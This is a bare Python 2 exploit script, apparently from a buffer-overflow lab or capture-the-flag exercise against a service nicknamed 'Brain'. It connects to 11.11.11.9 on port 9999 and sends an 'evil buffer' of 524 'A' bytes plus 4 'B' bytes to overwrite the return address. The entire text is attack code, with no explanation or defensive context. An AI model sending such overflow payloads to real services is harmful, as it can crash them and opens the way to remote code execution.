#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 524 + "B" * 4

try: 
     print "sending evil buffer..." 
     s.connect(('11.11.11.9',9999)) 
     data = s.recv(1024) 
     s.send(buffer + '\r\n') 
     print "\nDone!"

except: 
     print "Count not connect to Brain!"

